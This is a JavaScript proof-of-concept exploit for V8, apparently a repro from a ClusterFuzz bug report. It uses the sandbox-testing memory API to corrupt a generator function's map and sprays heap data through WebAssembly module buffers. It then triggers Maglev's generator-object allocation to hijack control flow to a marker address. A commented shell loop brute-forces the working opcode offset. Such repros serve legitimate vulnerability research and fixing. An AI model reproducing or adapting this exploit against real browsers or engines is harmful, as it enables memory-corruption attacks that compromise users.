// --sandbox-testing --single-threaded
// Offset tailored to the original ClusterFuzz component build from the report.
const kHeapObjectTag = 1;
const kJSArrayBufferBackingStoreOffset = 0x24;
const kSandboxSizeLog2 = 40;
const kSandboxedPointerShift = 64 - kSandboxSizeLog2;
const kJSFunctionPrototypeOrInitialMap = 0x1c;
const kMapBitField3Offset = 0xc;
const kMapInstanceSizeInWordsOffset = 0x4;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function abptr(ab) {
  let ab_ofs = getField64(getPtr(ab), kJSArrayBufferBackingStoreOffset) >> BigInt(kSandboxedPointerShift);
  let base = BigInt(Sandbox.base) + ab_ofs;
  return base;
}

function* fn() {
  for (let i = 0; i < 4000; i++) {
    yield;
  }
}

let gen = fn();

let ab = new ArrayBuffer(0x1000);
let dv = new DataView(ab);
let bs = abptr(ab);

/*
- invalid ValueRepresentation of 7 to fall though first switch-case
- invalid Opcode to exploit second switch-case over (exhaustive) enum
  - finding exploitable offset is easy, at least one vtable call will hit :)
    `for i in {0..65535}; do (timeout 1 ./d8 --sandbox-testing --single-threaded ./repro.js -- $i 2>&1 | grep 424242) && printf "$i\n\n"; done`
*/
let TARGET_PC = 0x424242424242n;
// let opcode = parseInt(arguments[0]);   // use this for offset search
let opcode = 2888;
dv.setUint32(0x800, (7 << 0x18) | opcode, true);
for (let i = 0x100; i < ab.byteLength; i += 8) {
  if (i == 0x800) continue;
  dv.setBigUint64(i, bs, true);
}
// for (let i = 0; i < 0x100; i += 8) {   // also use this for offset search
//   dv.setBigUint64(i, 0x424242420000n + BigInt(i), true);
// }
dv.setBigUint64(0, bs, true);
dv.setBigUint64(0x18, TARGET_PC, true);

// spray data
for (let i = 0; i < 3; i++) {
  let spray = new BigUint64Array(Array(0x1000 * (1 << i)).fill(bs + 0x800n));
  try {
    new WebAssembly.Module(spray.buffer);
  } catch {}
}

// fetch initial_map
let pfn = getPtr(fn);
let pim = getField(pfn, kJSFunctionPrototypeOrInitialMap);

// force !MapRef::IsInobjectSlackTrackingInProgress() for instance size simplification
setField(pim, kMapBitField3Offset, getField(pim, kMapBitField3Offset) & ~(0x7 << 29));

// overwrite instance_size_in_words = 0x0b, inobject_properties_start_or_constructor_function_index = 0x0b
// last slot is uninit, fetched from spray data
setField(pim, kMapInstanceSizeInWordsOffset, (getField(pim, kMapInstanceSizeInWordsOffset) & ~0xffff) | 0x0b0b);

// trigger MaglevGraphBuilder::TryBuildAndAllocateJSGeneratorObject()
for (let i = 0; i < 2000; i++) {
  gen.next();
}
